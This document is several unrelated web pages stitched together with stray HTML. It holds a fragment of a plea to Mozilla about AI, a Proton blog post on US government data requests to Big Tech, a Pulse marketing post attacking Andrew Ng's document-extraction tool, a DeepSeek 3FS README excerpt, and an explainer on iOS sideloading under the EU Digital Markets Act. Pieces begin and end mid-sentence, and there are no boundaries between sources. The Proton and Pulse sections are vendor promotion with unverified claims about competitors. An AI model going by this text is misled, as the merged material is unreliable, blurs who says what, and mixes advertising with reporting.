While a lot of people said this was a bad sign of the new direction Mozilla was moving in, I didn't take it as a red flag. Little did I know how much of a red flag it was; you could've chosen to promote that version of the next iteration of the web, but instead you went with AI.</p><p>I know that forks of Firefox await, versions of the browser that keep its old spirit alive. But I don't want to have to leave this browser or this community. Please reconsider.</p>

<p>Imagine a government that knows what you do each day — the people you talk to, the news you read, the places you go. You might think of North Korea or a similar totalitarian regime.</p>



<p>But the US government also has access to such a chillingly clear picture of your life, even without the apparatus of a surveillance state. All it needs to do is ask Big Tech.</p>



<p>And because giants like Meta, Google, and Apple must collect as much of your personal data as possible, there’s little they can do to protect your privacy.</p>

<p>US law enforcement has been increasingly quick to enlist Big Tech’s help in recent years. From late 2014 to early 2024, the number of accounts shared by Google jumped 530%; at Meta (formerly Facebook), it surged 675%; and at Apple, it climbed 621% (fed by an outlier second half of 2022, when they shared over 300,000 accounts). </p>

<p>In the last six months of 2023 and the first six months of 2024 (the last 12 months there’s data for), the US government made nearly 500,000 data requests to Google and Meta — more than all the other members of the so-called 14 Eyes Alliance combined.</p>



<h2>Google, Meta and Apple form the world’s largest surveillance machine</h2>



<p>The US government has recognized three things about the tech giants:</p>



<ul>
<li>They all rely on tracking their users to generate revenue — and have become exceptionally good at it.</li>



<li>They are almost impossible to avoid if you spend any time online.</li>



<li>Most important, they cannot adopt encryption without undermining their business models.</li>
</ul>



<p>In 2024, a journalist for The Times of London <a rel="noreferrer noopener" target="_blank" href="https://www.thetimes.com/article/meta-user-data-collection-facebook-instagram-whatsapp-9klqhzlq9">requested her data from Meta<span>(new window)</span></a> to see exactly how much information it had on her. She got back 20,000 pages, including 20,000 interactions with websites and apps that weren’t even directly connected to her Meta accounts. Thanks to the Meta pixel and data-sharing agreements with banks, health apps, local governments, grocery stores, countless websites, and more, there was no window of her life Meta couldn’t see into — and rarely a day it didn’t receive her data.</p>



<p>This is just one service. <a href="https://proton.me/blog/apple-ad-company">Apple</a> and <a href="https://proton.me/blog/google-shows-more-ads">Google</a> hold similar amounts of data — if not more. These companies monitor your entire digital life, compiling a detailed profile that can be handed over at the government’s request or shared with a third party. Essentially, once one of these companies collects your information, you’ve completely lost control of who can see it.</p>



<p>Proponents argue that this is simply standard police work in the 21st century. Most data requests require a judge to approve a subpoena, and Big Tech companies can and do fight overly broad or unjustified requests when they can. However, even if you say that the 500,000 data requests made by the US government all followed due process, there are still hundreds of thousands of requests that were never reviewed by a judge that companies cannot fight at all.</p>



<h2>The US government can access this info with no oversight</h2>



<p>The FISA allows US intelligence agencies to request user data for national security purposes. These requests are issued with little oversight and cannot legally be refused. Some FISA requests, such as ones made using the <a href="https://proton.me/blog/us-warrantless-surveillance#section-702-loophole">Section 702</a> loophole, are never individually reviewed by a judge at all.</p>

<p>Since 2014, FISA content requests to Meta have increased 2,171%, while those to Google have risen 594%. Apple, though less transparent with its records, reported a 274% increase in such requests between 2018 and 2023.</p>



<h2>Big Tech is government’s partner<strong> </strong>in surveillance</h2>



<p>To be clear, we are not faulting Big Tech companies for complying with lawful, limited data requests. Every company must comply with the laws of the land that governs them. However, there are several issues at play. First, law enforcement agencies can use overly broad warrants to get access to reams of sensitive data. These “reverse warrants” (so named because law enforcement doesn’t need to specify a suspect), like <a rel="noreferrer noopener" target="_blank" href="https://www.cnet.com/news/privacy/google-is-giving-data-to-police-based-on-search-keywords-court-docs-show/">geofencing<span>(new window)</span></a> or <a rel="noopener noreferrer" target="_blank" href="https://www.cnet.com/news/privacy/google-is-giving-data-to-police-based-on-search-keywords-court-docs-show/">search term warrants<span>(new window)</span></a>, let law enforcement see anyone who was in a specific area or who searched for a specific term in a given time period. Investigations that rely on this data routinely end up falsely identifying suspects, with innocent people being charged with crimes, including <a rel="noreferrer noopener" target="_blank" href="https://www.nbcnews.com/news/us-news/google-tracked-his-bike-ride-past-burglarized-home-made-him-n1151761">burglary<span>(new window)</span></a> and <a rel="noreferrer noopener" target="_blank" href="https://www.phoenixnewtimes.com/news/google-geofence-location-data-avondale-wrongful-arrest-molina-gaeta-11426374">murder<span>(new window)</span></a>. And certain FISA requests and <a href="https://proton.me/blog/us-warrantless-surveillance#national-security-letters">national security letters</a> let intelligence agencies or the FBI access data without any judicial oversight.</p>



<p>This brings us to the second problem. Big Tech companies know these abuses happen. Several of them even claim to care about your privacy. However, they cannot apply end-to-end encryption or even minimize user data collection without destroying their business models. In 2023, ads made up almost 98% of <a rel="noopener noreferrer" target="_blank" href="https://d18rn0p25nwr6d.cloudfront.net/CIK-0001326801/c7318154-f6ae-4866-89fa-f0c589f2ee3d.pdf">Meta’<span>(new window)</span></a><a rel="noreferrer noopener" target="_blank" href="https://d18rn0p25nwr6d.cloudfront.net/CIK-0001326801/c7318154-f6ae-4866-89fa-f0c589f2ee3d.pdf">s revenue<span>(new window)</span></a> and 77% of <a rel="noreferrer noopener" target="_blank" href="https://abc.xyz/assets/52/88/5de1d06943cebc569ee3aa3a6ded/goog023-alphabet-2023-annual-report-web-1.pdf">Alphabet<span>(new window)</span></a><a rel="noopener noreferrer" target="_blank" href="https://d18rn0p25nwr6d.cloudfront.net/CIK-0001326801/c7318154-f6ae-4866-89fa-f0c589f2ee3d.pdf">’<span>(new window)</span></a>s (specifically Google Ads). While Apple’s ad revenue is relatively small, it’s already <a rel="noreferrer noopener" target="_blank" href="https://www.businessinsider.com/apple-advertising-google-search-services-filings-2024-5">larger than Snap or X’s ad revenue<span>(new window)</span></a>, and growing fast. To protect their users’ privacy, these companies would have to fundamentally change how they make money, which is not something they have ever shown any appetite for.</p>



<p>Until this happens, they’ll continue monitoring you, collecting tens of thousands of pages of your information each year. And governments will continue to help themselves to this information.</p>



<h2>Want to take control of your privacy?</h2>



<p>As ubiquitous as Big Tech is, there is another way. Proton is based in <a href="https://proton.me/blog/switzerland">Switzerland</a>, a country with strict privacy laws. We cannot act on a data request unless it has been approved by the Swiss authorities. Moreover, Proton’s <a href="https://proton.me/blog/what-is-end-to-end-encryption">end-to-end encryption</a> ensures that even if we receive a valid request, we cannot access the content of your messages, files, or other sensitive information.</p>



<p>Our mission is to build a better internet where privacy is the default. We require minimal data to set up an account and offer anonymous payment options. Transparency is key to our approach — we make all our apps <a href="https://proton.me/community/open-source">open source</a>, share who makes up our team, and publish all government data requests in our <a href="https://proton.me/legal/transparency">Transparency Report</a> (we update this annually in March).</p>



<p>Proton provides a safer alternative, ensuring that your data is protected by design. At a time when marginalized groups and individuals face increasing threats, choosing privacy-focused services has never been more important.</p>

<div id="readability-page-1" class="page"><div><p>Today, Andrew Ng, one of the legends of the AI world, released a new document extraction service that went viral on X (<a href="https://x.com/AndrewYNg/status/1895183929977843970">link here</a>). At Pulse, we put the models to the test with complex financial statements and nested tables – the results were underwhelming to say the least, and suffer from many of the same issues we see when simply dumping documents into GPT or Claude.</p><p>Our engineering team, along with many X users, discovered alarming issues when testing complex financial statements:</p><ul role="list"><li><strong>Over 50% hallucinated values</strong> in complex financial tables</li><li><strong>Missing negative signs</strong> and currency markers</li><li><strong>Completely fabricated numbers</strong> in several instances</li><li><strong>30+ second processing times</strong> per document</li></ul><figure><p><img src="https://cdn.prod.website-files.com/6707c5683ddae1a50202bac6/67c11c3472901190a48f37d5_AD_4nXcsVArniAceFxxvlvsJRYfXlF-sti0gFtkstbghLibkKay2C_d7rWZPgPuinvJLmc-BVZSo0radqJl7dyqoLgqZhUEXyxqJ6FYjiPZBOtTp2kl6nqNKI7SeFbTzPXnuxthSMEyOIQ.png" loading="lazy" alt=""></p><figcaption>Ground Truth</figcaption></figure><figure><p><img src="https://cdn.prod.website-files.com/6707c5683ddae1a50202bac6/67c11c3d37e1c950cd8f0895_AD_4nXe0Vg_zeFFraWhcd4tqvE2pyTB4kf9VZ2JZD5rbvvi8_vxbHeKlVx9HwTn2aMlW6FoVbZ4pbAy-DvVd6IR306J8qVTOeWm_TAbEi6raUwqbTRcV7zDAls9p0Epe1hPB6JNt6R7djQ.png" loading="lazy" alt=""></p><figcaption>Andrew Ng OCR Output</figcaption></figure><figure><p><img src="https://cdn.prod.website-files.com/6707c5683ddae1a50202bac6/67c11c4e79e1aebc34ccec4d_AD_4nXcBer3Y3DbitGWJxlT4LM9XpZ2ZQ2AIpKsN62AhFejibMjVqZJ1AbKsWxYRfZ3SCW937eeU4zB76JYcFLZhb9FWgd43lrprfsOfCG8ilv-gBD-47gTWsMLBPrWML4SWqcHibneVLw.png" loading="lazy" alt=""></p><figcaption>Pulse Output</figcaption></figure><p>When financial decisions worth millions depend on accurate extraction, these errors aren't just inconvenient – they're potentially catastrophic.</p><p>Let’s run through some quick math: in a typical enterprise scenario with 1,000 pages containing 200 elements per page (usually repeated over tens of thousands of documents), even 99% accuracy still means 2,000 incorrect entries. That's 2,000 potential failure points that can completely compromise a data pipeline. Our customers have consistently told us they need over 99.9% accuracy for mission-critical operations. With probabilistic LLM models, each extraction introduces a new chance for error, and these probabilities compound across thousands of documents, making the failure rate unacceptably high for real-world applications where precision is non-negotiable.</p><p>As we've detailed in our <a href="https://www.runpulse.com/blog/why-llms-suck-at-ocr">previous viral blog post</a>, using LLMs alone for document extraction creates fundamental problems. Their nondeterministic nature means you'll get different results on each run. Their low spatial awareness makes them unsuitable for complex layouts in PDFs and slides. And their processing speed presents serious bottlenecks for large-scale document processing.</p><p>At Pulse, we've taken a different approach that delivers:</p><ul role="list"><li><strong>Accurate extraction</strong> with probability of errors slowly approaching 0</li><li><strong>Complete table, chart and graph data</strong> preservation</li><li><strong>Low-latency processing time</strong> per document</li></ul><p><a href="https://www.runpulse.com/blog/pulse-approach-to-document-intelligence">Our solution</a> combines proprietary table transformer models built from the ground up with traditional computer vision algorithms. We use LLMs only for specific, controlled tasks where they excel – not as the entire extraction pipeline.&nbsp;</p><p>If your organization processes financial, legal, or healthcare documents at scale and needs complete reliability (or really any industry where accuracy is non-negotiable), we'd love to show you how Pulse can transform your workflow.</p><p>Book a demo <a href="https://www.runpulse.com/demo">here</a> to see the difference for yourself.</p></div></div>]]></description>

<p dir="auto">The Fire-Flyer File System (3FS) is a high-performance distributed file system designed to address the challenges of AI training and inference workloads. It leverages modern SSDs and RDMA networks to provide a shared storage layer that simplifies development of distributed applications. Key features and benefits of 3FS include:</p>
<ul dir="auto">
<li>
<p dir="auto">Performance and Usability</p>
<ul dir="auto">
<li><strong>Disaggregated Architecture</strong> Combines the throughput of thousands of SSDs and the network bandwidth of hundreds of storage nodes, enabling applications to access storage resource in a locality-oblivious manner.</li>
<li><strong>Strong Consistency</strong> Implements Chain Replication with Apportioned Queries (CRAQ) for strong consistency, making application code simple and easy to reason about.</li>
<li><strong>File Interfaces</strong> Develops stateless metadata services backed by a transactional key-value store (e.g., FoundationDB). The file interface is well known and used everywhere. There is no need to learn a new storage API.</li>
</ul>
</li>
<li>
<p dir="auto">Diverse Workloads</p>
<ul dir="auto">
<li><strong>Data Preparation</strong> Organizes outputs of data analytics pipelines into hierarchical directory structures and manages large volume of intermediate outputs efficiently.</li>
<li><strong>Dataloaders</strong> Eliminates the need for prefetching or shuffling datasets by enabling random access to training samples across compute nodes.</li>
<li><strong>Checkpointing</strong> Supports high-throughput parallel checkpointing for large-scale training.</li>
<li><strong>KVCache for Inference</strong> Provides a cost-effective alternative to DRAM-based caching, offering high throughput and significantly larger capacity.</li>

<p dir="auto">The following figure demonstrates the throughput of read stress test on a large 3FS cluster. This cluster consists of 180 storage nodes, each equipped with 2×200Gbps InfiniBand NICs and sixteen 14TiB NVMe SSDs. Approximately 500+ client nodes were used for the read stress test, with each client node configured with 1x200Gbps InfiniBand NIC. The final aggregate read throughput reached approximately 6.6 TiB/s with background traffic from training jobs.</p>

<p dir="auto">We evaluated <a href="https://github.com/deepseek-ai/smallpond">smallpond</a> using the GraySort benchmark, which measures sort performance on large-scale datasets. Our implementation adopts a two-phase approach: (1) partitioning data via shuffle using the prefix bits of keys, and (2) in-partition sorting. Both phases read/write data from/to 3FS.</p>
<p dir="auto">The test cluster comprised 25 storage nodes (2 NUMA domains/node, 1 storage service/NUMA, 2×400Gbps NICs/node) and 50 compute nodes (2 NUMA domains, 192 physical cores, 2.2 TiB RAM, and 1×200 Gbps NIC/node). Sorting 110.5 TiB of data across 8,192 partitions completed in 30 minutes and 14 seconds, achieving an average throughput of <em>3.66 TiB/min</em>.</p>

<p dir="auto">KVCache is a technique used to optimize the LLM inference process. It avoids redundant computations by caching the key and value vectors of previous tokens in the decoder layers.
The top figure demonstrates the read throughput of all KVCache clients, highlighting both peak and average values, with peak throughput reaching up to 40 GiB/s. The bottom figure presents the IOPS of remove ops from garbage collection (GC) during the same time period.</p>

<h2 data-group="eu-sideloading" id="wait-i-thought-the-eu-mandated-that"><a href="#wait-i-thought-the-eu-mandated-that"><span>😮 Wait, I thought the EU mandated that?</span></a></h2><p>The <span><a href="https://digital-markets-act.ec.europa.eu/index_en">Digital Markets Act</a><i></i></span> is a recent EU antitrust law with the stated goal of making digital markets "fairer and more contestable". <span><a href="https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=uriserv%3AOJ.L_.2022.265.01.0001.01.ENG&amp;toc=OJ%3AL%3A2022%3A265%3ATOC#art_6">Article 6(4)</a><i></i></span> reads as follows:</p><div><blockquote>



<p><i>The gatekeeper shall allow and technically enable the installation and effective use of third-party software applications or software application stores using, or interoperating with, its operating system and allow those software applications or software application stores to be accessed by means other than the relevant core platform services of that gatekeeper. The gatekeeper shall, where applicable, not prevent the downloaded third-party software applications or software application stores from prompting end users to decide whether they want to set that downloaded software application or software application store as their default. The gatekeeper shall technically enable end users who decide to set that downloaded software application or software application store as their default to carry out that change easily.</i></p><p><i>The gatekeeper shall not be prevented from taking, to the extent that they are strictly necessary and proportionate, measures to ensure that third-party software applications or software application stores do not endanger the integrity of the hardware or operating system provided by the gatekeeper, provided that such measures are duly justified by the gatekeeper.</i></p><p><i>Furthermore, the gatekeeper shall not be prevented from applying, to the extent that they are strictly necessary and proportionate, measures and settings other than default settings, enabling end users to effectively protect security in relation to third-party software applications or software application stores, provided that such measures and settings other than default settings are duly justified by the gatekeeper.</i></p></blockquote>
</div><p>Since Apple was designated as a gatekeeper under the DMA, and its mobile operating systems iOS and iPadOS were designated as core platform services, Apple is obligated to comply with the above rules. As a consequence, support for third party app stores in the EU was introduced with iOS 17.4 in March 2024.</p><p><strong>Unfortunately, the terms of Apple's compliance leave much to be desired, and "sideloading", as per the <a href="#what-would-it-mean-for-ios-to-have-sideloading">conventional definition</a>, is still not available on iOS:</strong></p><ul>
<li>All apps and app updates distributed outside the App Store still must be manually reviewed by employees at Apple, approved, and "notarized", else iOS will reject their installation. The criteria Apple uses to determine whether or not to approve the app is a <a href="#macos-vs.-ios-notarization-process">subset of the App Store guidelines</a> (with an emphasis on privacy and security).</li>
<li>Furthermore, on top of the $100/yr Apple Developer subscription required to submit apps for notarization, Apple also collects a significant <span><a href="https://developer.apple.com/support/core-technology-fee">"Core Technology Fee"</a><i></i></span> from developers distributing outside the App Store, easily totaling to a much higher percentage cut than the App Store's 30%, and possibly creating a net loss or even bankrupting the app developer, making alternative distribution an unattractive option in most cases. (Note that fee waivers are available for fully non-commercial apps.)</li>
</ul><p>The DMA also does not enable certain types of apps which are already available through <a href="#how-do-i-sideload-unofficially-on-ios">unofficial sideloading methods</a>:</p><ul>
<li>Apps that require JIT for performance, such as advanced emulators and virtual machine apps, with the exception of approved web browser apps (of which there are currently none) <a href="#fn1" id="fnref1" role="doc-noteref">[1]</a>
<ul>
<li><span><a href="https://getutm.app/">UTM</a><i></i></span> is an example of such an app.</li>
</ul></li>
<li>Apps that use private APIs or OS frameworks in an "unintended" manner (as per <span><a href="https://developer.apple.com/app-store/review/guidelines/#software-requirements">notarization guideline 2.5.1</a><i></i></span>)
<ul>
<li>Riley Testut's clipboard manager app, "Clip", was <span><a href="https://www.theverge.com/24100979/altstore-europe-app-marketplace-price-games#:~:text=For%20example%2C%20after%20I%20had%20tested%20Clip%2C%20Testut%20had%20to%20tweak%20the%20app%E2%80%99s">initially rejected</a><i></i></span> under this policy.</li>
</ul></li>
</ul><p>Due to the aforementioned caveats, I will henceforth be referring to these apps as "alternative apps" rather than "sideloaded apps".</p><p>Apple believes that its notarization guidelines for alternative apps do not violate the DMA due to the exception provided in Article 6(4), which allows gatekeepers to take measures to ensure that alternative apps don't "endanger the integrity of the hardware or operating system", if said measures are "strictly necessary and proportionate".</p><p>Not everyone agrees with Apple's interpretation of the DMA, however. Epic Games has described Apple's changes as <span><a href="https://www.theverge.com/2024/1/25/24050696/epic-games-tim-sweeney-apple-app-store-response">"malicious compliance"</a><i></i></span>. The Free Software Foundation Europe has released <span><a href="https://fsfe.org/news/2024/news-20240627-01.en.html">multiple statements</a><i></i></span> arguing that Apple's notarization process is not in compliance with the DMA, since (1) third party apps on iOS don't possess the capability to compromise the integrity of the OS and (2) on macOS, Apple's other computing platform, users can choose to install apps that aren't notarized by Apple (provided they accept the risks involved), yet macOS still manages to provide a relatively secure computing environment. It should also be noted that while users are highly encouraged to only run notarized apps on macOS, the notarization requirements for macOS are <a href="#macos-vs.-ios-notarization-process">much less stringent</a> and don't impede legitimate (non-malicious) developers in any meaningful way, unlike the iOS requirements.</p><p>As of the time of writing, the European Commission is still in the process of enforcing the DMA and interpreting compliance obligations. A <span><a href="https://digital-markets-act.ec.europa.eu/commission-sends-preliminary-findings-apple-and-opens-additional-non-compliance-investigation-2024-06-24_en">non-compliance investigation</a><i></i></span> against Apple was opened in June 2024 regarding "the contractual requirements imposed on alternative app developers" such as the Core Technology Fee, and another investigation regarding "the checks and reviews put in place by Apple to validate apps and alternative app stores to be sideloaded" may be opened soon.</p><p>To ensure compliance, Apple should follow in the footsteps of other digital gatekeepers and provide a means for advanced users who accept the risks to sideload freely. For examples of how Apple could do this without impacting non-technical users, see <a href="#do-other-devices-support-sideloading">here</a>.</p></div>
<div>
<h2 data-group="eu-sideloading" id="can-hobbyists-take-advantage-of-the-eus-dma-today"><a href="#can-hobbyists-take-advantage-of-the-eus-dma-today"><span>🧑‍💻 Can hobbyists take advantage of the EU's DMA today?</span></a></h2><p>While the DMA does not (as of the time of writing) enable true sideloading, it does theoretically enable opportunities for hobbyist developers to create apps that would have otherwise been rejected. It may also allow hobbyists with no intention of distributing to create personal apps for their own devices, provided they are willing to polish their apps to the extent that they meet Apple's notarization requirements. <strong>Remember, Apple will be reviewing the app under the impression that you are attempting to release it publicly to iOS users around the world, so the requirements are designed with that in mind.</strong></p><p>With that being said:</p><ul>
<li>Apple has waived the Core Technology Fee for non-commercial apps (though not for app stores <a href="#fn2" id="fnref2" role="doc-noteref">[2]</a>) that make no profit whatsoever, so the only fee you would pay is the $100 annual Apple Developer fee, which is required in order to submit apps for notarization.</li>
<li>Apple has waived the <span><a href="https://developer.apple.com/app-store/review/guidelines/#minimum-functionality">"minimal functionality"</a><i></i></span> portion of the App Store guidelines for alternative apps, which would otherwise forbid apps that aren't "particularly useful, unique, or app-like".</li>
<li><strong>Once an app is notarized, the signature does not appear to expire, and that specific build of the app can be installed and used indefinitely on any iOS device in the EU.</strong> You would however need to maintain your Apple Developer subscription and ensure ongoing compliance with the notarization guidelines in order to issue updates for your app.</li>
</ul><p>In general, it seems as though Apple may approve hobbyist apps even if they have no clear purpose for a general audience and are only intended to be used by the developer. The limits of what Apple is willing to approve for alternative distribution have yet to be tested. Unfortunately, due to <a href="#how-do-i-sideload-unofficially-on-ios">time-based expiry of all "development" certificates</a> (including paid ones), there is currently no better way to develop personal apps just for yourself, as the only (official) alternative is paying the $100 Apple Developer Program fee every year into the foreseeable future just to keep your app from expiring (even if you aren't actively updating it). It's truly a shame that Apple has created a unique situation where hobbyist developers have no better option than to pester Apple employees with pointless manual reviews just to create apps for their own personal use, which won't ever be installed on other user's devices.</p><div>
<h2>
⚠️
</h2>
<p>
If you're planning on publishing apps to the App Store in the future, please note that it's unclear if it's possible to switch back to the (arguably better) non-EU terms after you've already agreed to the EU terms.
</p>
</div><p><strong>You don't have to be located in the EU to submit apps for alternative distribution inside the EU.</strong> If you want to start experimenting with alternative apps right now despite the current limitations: AltStore PAL is an officially approved third party app store available for free, allowing the installation of notarized apps from any source. You may <span><a href="https://faq.altstore.io/developers/distribute-with-altstore-pal">review their documentation here</a><i></i></span>. You'll need an Apple Developer subscription, and you'll need to accept the alternative EU terms.</p></div>

Apple utilizes hardware sensors to determine the user's geographical location in order to check eligibility for alternative apps and marketplaces as required in the EU, in addition to requiring an Apple ID registered in the EU.</p><p>It has been demonstrated to be possible to spoof some of these checks and access EU-exclusive features such as alternative apps outside the EU on iPhones and iPads.

(There are no guarantees that Apple won't make it more difficult to spoof these checks in the future, so you shouldn't rely on this.)</p><p>Once a device detects that it has left the EU, <strong>alternative apps that have already been installed will continue to work</strong>, but they will no longer receive updates after a 30-day grace period until the device moves back to the EU.</p><p>Something else that should be noted is that users from around the world can benefit from the competition that alternative app stores bring to Apple's store in general. In fact, this has already happened; Apple's <span><a href="https://www.theverge.com/2024/4/5/24122341/apple-app-store-game-emulators-super-apps">unexpected reversal</a><i></i></span> of its long-standing policy against game console emulators was most likely a result of the Digital Markets Act, as it removes one of the primary incentives users would have otherwise had for installing Riley Testut's AltStore and his popular "Delta" emulator.</p></div>

<h2 id="what-is-sideloading"><a href="#what-is-sideloading"><span>📱 What is "sideloading"?</span></a></h2><p>Sideloading is simply the act of installing apps on your computing device that haven't been explicitly reviewed and approved by the company who made the device (or the operating system running on it). Traditionally this has just been called "installing software", because it used to be the standard method before the advent of centralized app stores.</p><p>It's unclear exactly when the term (as per the above definition) was first introduced into the general discourse. But according to Google data, it was most likely around 2009 at the earliest:</p><figure>
<img src="https://doesioshavesideloadingyet.com/assets/sideloading_google_trends.png" alt="Google Trends worldwide interest in &quot;sideloading&quot; from 2004-present">

</figure><p>(Not coincidentally, Apple launched the iPhone in 2007.)</p><p>It's quite unfortunate that a term with a negative connotation was coined to describe an inherently neutral activity. If I was being conspiratorial, I'd say it was all part of an elaborate profit-seeking plot by Apple to create <span><a href="https://en.wikipedia.org/wiki/Fear,_uncertainty,_and_doubt">FUD</a><i></i></span> surrounding the topic. I'd tell you that "sideloading is the new <span><a href="https://www.vox.com/2015/1/15/7551873/jaywalking-history">jaywalking</a><i></i></span>".</p><p>But the truth is probably more nuanced than that. Malware used to be much more prevalent (and damaging) than it is today. It's getting harder and harder for attackers to convince people to execute malicious payloads on their devices, and the App Store most likely has something to do with that. Attackers have adapted to their new environment, and are largely migrating to other techniques that aren't so easily mitigated by software locks, such as phishing and cold call scamming. That being said, our computing devices are more secure than ever from the average user's perspective.</p><p>There's no denying that the model has begun to shift from users downloading or purchasing software directly from developers, to users downloading software from an "app store" middleman. Users delegate trust to the app store to vet the software they download to ensure it works properly, isn't malicious, and isn't accessing their data without their consent. For the average user, this creates a safer environment within which they can perform their computing tasks.</p><p>The App Store model clearly has real benefits for users. It would be dishonest to claim that protecting the end user's privacy and security is Apple's only motivation for pushing this model so heavily, though. There's of course enormous incentive created by the enormous profit generated through forcing everyone to use a centralized store. Apple's Services division, which includes the App Store, is their second largest, and has remained that way since Q3 2017. In Q4 2024, Apple made 26% of their revenue from Services. The Services division has been consistently creeping upwards over time, taking away from hardware's share year after year. <a href="#fn3" id="fnref3" role="doc-noteref">[3]</a></p><p>We should keep in mind that this didn't happen overnight. When the iPhone was released in June 2007, it didn't have an app store, and there was no (<span><a href="https://en.wikipedia.org/wiki/IOS_jailbreaking#JailbreakMe_and_AppSnapp">official</a><i></i></span>) method to install new apps. Steve Jobs described the new device "merely" as a "widescreen iPod with touch controls, a revolutionary mobile phone, and a breakthrough Internet communicator" during his unforgettable 2007 WWDC presentation. The (technically arbitrary) software limitations imposed on Apple's new <span><a href="https://web.archive.org/web/20220925123655/https://www.wired.com/2007/05/steve-jobs-ipho/">OSX-powered</a><i></i></span> portable-computer-but-not-advertised-as-such did not stand in the way of its success. People were so blown away by the iPhone, that any software shortcomings could easily be excused. The iPhone SDK was released in March 2008, alongside the announcement of the App Store, and it was confirmed that the App Store would be the exclusive method for distributing apps on the platform.</p><p>It's been 17 years since the release of the iPhone, and needless to say, smartphones and other mobile computing devices have changed the world. Smartphones are no longer a "nice to have", but rather an essential item we carry with us at all times, wherever we go. We <span><a href="https://www.theguardian.com/lifeandstyle/2017/aug/28/does-phone-separation-anxiety-really-exist">experience anxiety</a><i></i></span> when we realize we forgot to bring our smartphone with us.</p><p>Third party app support on iPhone, competition from Android, and <span><a href="https://en.wikipedia.org/wiki/IOS_jailbreaking">talented hackers</a><i></i></span> allowed developers to begin pushing the limits of what these "phones" could do. Apple may not have realized it at the time, but it didn't just invent the modern smartphone in 2007; it invented the modern computer. iPhone OS became iOS, then iPadOS. Today, the iPad Pro is advertised as <span><a href="https://9to5mac.com/2017/11/16/ipad-pro-whats-a-computer-ad/">all but a computer</a><i></i></span>! The latest iPads even use the same processors as the latest Macs.</p><p>The iPhone paved the way for the app store model and other modern computer security features which are now considered baseline, such as full device encryption and verified/secure boot. With each new iOS security feature rolling out, Apple challenged the rest of the industry to improve their own security and privacy protections. All mainstream operating systems, including Windows, macOS, Chrome OS, and Android now implement an <span><a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)">app sandbox</a><i></i></span> in some way (to varying degrees of success), something the iPhone did first.</p><p>If the entire industry is moving towards Apple's approach, then we should probably start thinking about what that means for the future of personal computing. To my knowledge, we've never seen a (conventional) "computer" that isn't user-programmable enter the mainstream market. We are now, though, seeing non-conventional computers which are many times more powerful than yesterday's conventional computers on paper, but are not user-programmable. We're becoming more tolerant of artificial limitations imposed by the operating systems we're forced to run on these devices, because we're told that it's the only way we can remain secure.</p><p>I think that, for the average user, these limitations are perfectly acceptable, and indeed preferable. But at the same time, I don't think we should leave powerusers and developers in the dust as we craft this new world of secure computing. Apple has made some brilliant, ultraportable, and remarkably powerful computing devices, but the OS that runs on them is preventing users from realizing their true potential, and it's kind of sad. Implementing advanced features such as sideloading in a way that prevents social engineering attacks convincing non-technical users to enable them is non-trivial, but <a href="#case-study-chromeos">definitely possible</a>, and absolutely vital if we are to avoid redefining the modern "computer" as something entirely different.</p></div>

<h2 id="what-are-benefits-of-sideloading"><a href="#what-are-benefits-of-sideloading"><span>💙 What are benefits of sideloading?</span></a></h2><p>Non-exhaustive list of sideloading use cases and benefits:</p><ul>
<li>Allows the end user to <span><a href="https://www.bennettnotes.com/notes/why-does-apple-restrict-hobby-development/">write apps for their own device</a><i></i></span>
<ul>
<li>In other words: it would enable the use of iOS devices as <span><a href="https://en.wikipedia.org/wiki/Von_Neumann_architecture">general-purpose computers</a><i></i></span></li>
</ul></li>
<li>Allows for perfectly legitimate apps that cannot be uploaded to the App Store due to its strict guidelines, creating a more fair, more free, and more open market for apps
<ul>
<li>Examples include:
<ul>
<li>Apps that require <span><a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JIT compilation</a><i></i></span> to function, such as <span><a href="https://dolphinios.oatmealdome.me/">Dolphin</a><i></i></span>, a Wii emulator that runs beautifully on iOS using JIT</li>
<li>Apps that require JIT compilation for performance, such as <span><a href="https://getutm.app/">UTM</a><i></i></span>, which brings virtual machines to iOS</li>
<li>Alternative web browser engines such as Firefox (Gecko) and Chrome (Blink), which would bring competition to the space, benefiting all users</li>
<li>Alternative clients for popular services like YouTube
<ul>
<li>I wasn't able to find an example for iOS, but <span><a href="https://newpipe.net/">NewPipe</a><i></i></span> is my preferred YouTube client on Android, and <span><a href="https://grayjay.app/">Grayjay</a><i></i></span> is a promising new Android-exclusive app that combines different streaming services together</li>
<li>Despite being perfectly legal in most countries, these can't be uploaded to the App Store due to <span><a href="https://developer.apple.com/app-store/review/guidelines/#intellectual-property">guideline 5.2.2</a><i></i></span></li>
</ul></li>
<li>Apps that use OS APIs in an "unintended" manner, such as <span><a href="https://rileytestut.com/blog/2020/06/17/introducing-clip/">Clip</a><i></i></span></li>
<li>Apps that execute code dynamically, such as <span><a href="https://ish.app/blog/ish-jit-and-eu">performant terminal emulators</a><i></i></span></li>
</ul></li>
<li>These classes of apps used to be entirely excluded from the App Store until Apple suddenly reversed course, most likely in response to legislation, antitrust investigations, or competition from third party app stores:
<ul>
<li><span><a href="https://www.theverge.com/2024/4/5/24122341/apple-app-store-game-emulators-super-apps">Game console emulators</a><i></i></span>, most likely to remove a primary incentive users would have otherwise had for installing Riley Testut's AltStore and his popular "Delta" emulator.</li>
<li>Cloud streaming services, most likely due to an <span><a href="https://www.theverge.com/2024/3/21/24107633/apple-streaming-super-apps-doj-lawsuit">impending antitrust lawsuit</a><i></i></span>.</li>
</ul></li>
<li>Keep in mind, I could probably list even more examples if sideloading were officially supported and these apps didn't <a href="#how-do-i-sideload-unofficially-on-ios">require workarounds</a> such as jailbreaking to use! It's currently difficult to justify developing iOS apps that won't be accepted into the App Store, because very few users are going to be able to actually use them.</li>
</ul></li>
<li>Allows <span><a href="https://en.wikipedia.org/wiki/Free_software">free and open source software (FOSS)</a><i></i></span> to exist on iOS
<ul>
<li>Currently, FOSS is completely blocked by all iOS devices at the OS level! I personally believe in the value of FOSS, and I try to use as much of it as possible, but regardless of your feelings on it, it's difficult to argue that it should be completely blocked on one of the most popular computing platforms. I believe it should be given a fair chance to compete with other development models.</li>
<li>Note that open source software is not the same as FOSS. Open source software is allowed on iOS, but FOSS is not. To quality as FOSS, a software product must provide all four essential freedoms to the end user. Since end users cannot freely make changes to their own copy of any iOS app, <em>even if the developers want to allow this</em>, all iOS apps automatically violate <span><a href="https://www.gnu.org/philosophy/free-sw.en.html#four-freedoms">freedom #1 of the official Free Software Definition</a><i></i></span>, and as such they are not FOSS.</li>
